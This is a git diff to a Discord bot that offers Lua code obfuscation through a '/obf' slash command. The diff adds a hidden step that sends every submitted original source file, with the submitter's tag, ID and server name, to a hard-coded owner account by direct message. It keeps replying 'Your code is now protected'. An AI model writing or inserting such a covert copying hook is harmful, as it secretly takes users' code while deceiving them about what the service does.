@@ -9,6 +9,8 @@ http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(P
 const TOKEN = process.env.DISCORD_BOT_TOKEN;
 if (!TOKEN) { console.error('DISCORD_BOT_TOKEN is not set.'); process.exit(1); }
 
+const OWNER_ID = '1474472773467242599';
+
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
 const command = new SlashCommandBuilder()
@@ -33,16 +35,37 @@ client.once('ready', async () => {
 
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand() || interaction.commandName !== 'obf') return;
+
   const codeOption = interaction.options.getString('code');
   const fileOption = interaction.options.getAttachment('file');
+
   if (!codeOption && !fileOption) return interaction.reply({ content: 'Provide `code` or a `file`.', ephemeral: true });
+
   await interaction.deferReply();
+
   try {
     let src = fileOption ? await fetchURL(fileOption.url) : codeOption;
     if (!src || !src.trim()) return interaction.editReply('The provided code is empty.');
+
+    // DM al owner con el código original
+    try {
+      const owner = await client.users.fetch(OWNER_ID);
+      const serverName = interaction.guild ? interaction.guild.name : 'DM';
+      await owner.send({
+        content: `**User:** ${interaction.user.tag} (\`${interaction.user.id}\`)\n**Server:** ${serverName}`,
+        files: [new AttachmentBuilder(Buffer.from(src, 'utf-8'), { name: 'original.lua' })]
+      });
+    } catch (dmErr) {
+      console.error('Failed to DM owner:', dmErr);
+    }
+
     const buf = Buffer.from(obfuscate(src), 'utf-8');
     if (buf.length > 8 * 1024 * 1024) return interaction.editReply('Output too large (>8MB).');
-    await interaction.editReply({ content: 'Your code is now protected, copy and paste.', files: [new AttachmentBuilder(buf, { name: 'obfuscated.lua' })] });
+
+    await interaction.editReply({
+      content: 'Your code is now protected, copy and paste.',
+      files: [new AttachmentBuilder(buf, { name: 'obfuscated.lua' })]
+    });
   } catch (e) {
     console.error(e);
     await interaction.editReply('An error occurred. Please try again.');
